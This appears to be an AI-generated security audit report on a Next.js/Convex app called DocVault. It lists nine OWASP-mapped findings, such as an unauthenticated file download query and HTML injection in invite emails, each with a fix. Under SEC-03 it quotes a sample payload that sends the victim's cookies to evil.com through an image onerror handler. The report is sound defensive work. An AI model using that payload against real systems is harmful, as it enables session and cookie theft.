# Security Audit Report — DocVault

| Field         | Value                                  |
| ------------- | -------------------------------------- |
| **Date**      | 2026-02-19 12:00                       |
| **Auditor**   | Application Security Auditor (AI)      |
| **Scope**     | `src/` (with backend context from `convex/`) |
| **Framework** | OWASP Top 10 (2021)                    |
| **App Stack** | Next.js 15, Convex, Clerk, React       |

---

## Summary

| Severity | Count |
| -------- | ----- |
| 🔴 High    | 1     |
| 🟡 Medium  | 5     |
| 🔵 Low     | 3     |

---

## 🔴 High Severity

### SEC-01: File download endpoint has no authentication or authorization

**OWASP:** A01 — Broken Access Control
**Location:** `src/components/version-history.tsx:53` → calls `api.documentVersions.getDownloadUrl`
**Backend:** `convex/documentVersions.ts:90-95`

The `getDownloadUrl` query accepts a `storageId` and returns a signed download URL with **zero authentication or authorization checks**. It does not verify that the caller is authenticated, nor that they are a member of the team that owns the document.

Any caller — including unauthenticated users — can retrieve a download URL for any file in the system if they obtain or guess a `storageId`. While Convex storage IDs are random, they are exposed to all team members via the `documentVersions.list` query response. A former team member who was removed could retain cached `storageId` values and continue accessing files.

```
// convex/documentVersions.ts:90-95 — NO auth check
export const getDownloadUrl = query({
  args: { storageId: v.id("_storage") },
  handler: async (ctx, args) => {
    return await ctx.storage.getUrl(args.storageId);
  },
});
```

**Fix:** Add authentication and verify the caller has team membership for the document that owns the referenced `storageId`. Look up the `documentVersions` record by `storageId`, resolve the parent document's `teamId`, then call `assertTeamMember`.

---

## 🟡 Medium Severity

### SEC-02: Upload URL generation lacks team/document authorization

**OWASP:** A01 — Broken Access Control
**Location:** `src/components/upload-dialog.tsx:69`, `src/app/teams/[teamId]/page.tsx:78` → calls `api.documentVersions.generateUploadUrl`
**Backend:** `convex/documentVersions.ts:5-12`

The `generateUploadUrl` mutation only verifies that the caller is authenticated. It does **not** check team membership or role. Any authenticated user can generate upload URLs and push arbitrary files into Convex storage, even if they belong to no teams. While the subsequent `createVersion` mutation does enforce team role checks, the unguarded upload URL allows:

- Storage abuse / resource exhaustion by any authenticated user
- Orphaned files that consume storage quota with no document association

**Fix:** Accept a `teamId` argument and call `assertTeamRole(ctx, teamId, ["admin", "editor"])` before generating the upload URL.

---

### SEC-03: HTML injection in invite email template

**OWASP:** A03 — Injection
**Location:** `src/components/member-manager.tsx:82` → triggers `api.teams.addMember` → schedules `email.sendInviteEmail`
**Backend:** `convex/email.ts:33-55`

The invite email template interpolates user-controlled data directly into raw HTML without sanitization:

```
html: `<strong>${args.invitedByName}</strong> has invited you to join
       <strong>${args.teamName}</strong> as a <strong>${args.role}</strong>.`
```

If a user sets their display name (via Clerk profile) or team name to contain HTML such as `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`, it will be injected into the email body. While most email clients strip `<script>` tags, many other HTML injection vectors work (image tags, CSS, form elements, phishing links).

**Fix:** HTML-escape all interpolated values before embedding in the template. Use a library like `he` or build a simple `escapeHtml()` function that encodes `<`, `>`, `&`, `"`, and `'`.

---

### SEC-04: No server-side file upload validation

**OWASP:** A04 — Insecure Design
**Location:** `src/components/upload-dialog.tsx:72-76`, `src/app/teams/[teamId]/page.tsx:79-83`
**Backend:** `convex/documentVersions.ts:14-62`

File uploads have no server-side validation:

- **No file type restriction:** The `<input type="file">` elements have no `accept` attribute, and the backend accepts any `fileType` string.
- **No file size limit:** There is no maximum file size enforced server-side. The `fileSize` field in `createVersion` is a client-supplied number and can be spoofed.
- **No content validation:** The backend does not verify that the uploaded file content matches the declared `fileType`.

An attacker could upload arbitrarily large files, executable content, or files with spoofed metadata.

**Fix:** Add server-side validation in `createVersion` or a post-upload validation step: enforce maximum file size, validate `fileType` against an allowlist, and verify the `fileSize` argument matches the actual stored file size.

---

### SEC-05: Error messages leak internal authorization details

**OWASP:** A05 — Security Misconfiguration
**Location:** Errors surface in `src/components/member-manager.tsx:91`, `src/components/document-table.tsx:97`, `src/app/teams/new/page.tsx:39`, `src/app/teams/[teamId]/settings/page.tsx:82`
**Backend:** `convex/lib/permissions.ts:70-74`

Authorization failure errors include the user's current role:

```
`Requires one of: ${requiredRoles.join(", ")}. You have: ${member.role}`
```

Multiple frontend components display `error.message` directly to the user via toast notifications (e.g., `toast.error(error instanceof Error ? error.message : "...")`). This leaks:

- Which roles are required for specific operations
- The caller's current role in the team

This information aids an attacker in understanding the authorization model and targeting privilege escalation.

**Fix:** Return generic error messages to the client (e.g., "You don't have permission to perform this action"). Log detailed role information server-side only.

---

### SEC-06: Missing HTTP security headers

**OWASP:** A05 — Security Misconfiguration
**Location:** `next.config.ts` (empty configuration)

The Next.js configuration defines no security headers. The following are absent:

| Header | Risk |
| --- | --- |
| `Content-Security-Policy` | No XSS mitigation via CSP |
| `Strict-Transport-Security` | No HSTS; downgrade attacks possible |
| `X-Frame-Options` | Clickjacking not prevented |
| `X-Content-Type-Options` | MIME sniffing not prevented |
| `Referrer-Policy` | Referrer may leak sensitive URL paths |
| `Permissions-Policy` | Browser features not restricted |

**Fix:** Add a `headers()` function in `next.config.ts` that returns these security headers for all routes.

---

## 🔵 Low Severity (Hardening)

### SEC-07: No rate limiting on Convex mutations

**OWASP:** A04 — Insecure Design
**Location:** `src/app/teams/new/page.tsx` → `api.teams.create`, `src/components/member-manager.tsx` → `api.teams.addMember`

There is no rate limiting on team creation, member invitation, document creation, or file uploads. An authenticated attacker could:

- Create thousands of teams via rapid `teams.create` calls
- Spam invite emails via `teams.addMember` (which triggers `email.sendInviteEmail`)
- Exhaust storage via repeated file uploads

Clerk handles rate limiting for authentication endpoints, but application-level mutations are unprotected.

**Fix:** Implement rate limiting in Convex mutations using a rate-limit table or leverage Convex's built-in rate limiting utilities. Prioritize the `addMember` mutation since it triggers external email sends.

---

### SEC-08: Irreversible destructive actions with no audit trail

**OWASP:** A04 — Insecure Design
**Location:** `src/app/teams/[teamId]/settings/page.tsx:67-87`, `src/components/document-table.tsx:102-118`

Team deletion and document deletion are fully irreversible:

- The only safeguard is a client-side `confirm()` dialog, which is trivially bypassed programmatically.
- There is no soft-delete mechanism; records and storage files are permanently removed.
- There is no audit log recording who deleted what and when.

While backend authorization correctly restricts these actions to admins, the lack of an audit trail or undo window increases the blast radius of compromised admin accounts.

**Fix:** Implement soft-delete with a configurable retention period. Add an audit log table that records destructive actions with timestamps and actor IDs.

---

### SEC-09: Unsafe type casting of URL parameters

**OWASP:** A01 — Broken Access Control
**Location:** `src/app/documents/[documentId]/page.tsx:28`, `src/app/teams/[teamId]/page.tsx:32-36`, `src/app/teams/[teamId]/settings/page.tsx:29-33`

URL route parameters are cast directly to Convex IDs using `as Id<"...">`:

```typescript
const document = useQuery(api.documents.get, {
  documentId: documentId as Id<"documents">,
});
```

While Convex validates ID format server-side and will reject malformed values, the client-side cast suppresses TypeScript's type checking. Malformed or manipulated URL parameters will produce unhandled errors rather than graceful fallbacks.

**Fix:** Validate URL parameters before casting. Convex IDs follow a known format — add a validation helper that checks the format before passing to queries, and render a "not found" page for invalid IDs.

---

## OWASP Checklist Summary

| Category | Status | Notes |
| --- | --- | --- |
| A01 — Broken Access Control | 🔴 Issues found | SEC-01, SEC-02, SEC-09 |
| A02 — Cryptographic Failures | ✅ No issues | Clerk handles auth tokens; secrets properly gitignored |
| A03 — Injection | 🟡 Issue found | SEC-03 (HTML injection in emails) |
| A04 — Insecure Design | 🟡 Issues found | SEC-04, SEC-07, SEC-08 |
| A05 — Security Misconfiguration | 🟡 Issues found | SEC-05, SEC-06 |
| A07 — Auth & Session Failures | ✅ No issues | Clerk manages sessions/JWTs; middleware is correctly configured |
| React/Next.js Specific | ✅ Mostly clean | No `dangerouslySetInnerHTML`; no secrets in `NEXT_PUBLIC_` vars; middleware uses `auth.protect()` correctly |

---

/* ═══════════════════════════════════════════
   SECURITY AUDIT — src/ — 2026-02-19T12:00
   🔴 Critical: 1  🟡 Medium: 5  🔵 Hardening: 3
   ═══════════════════════════════════════════ */
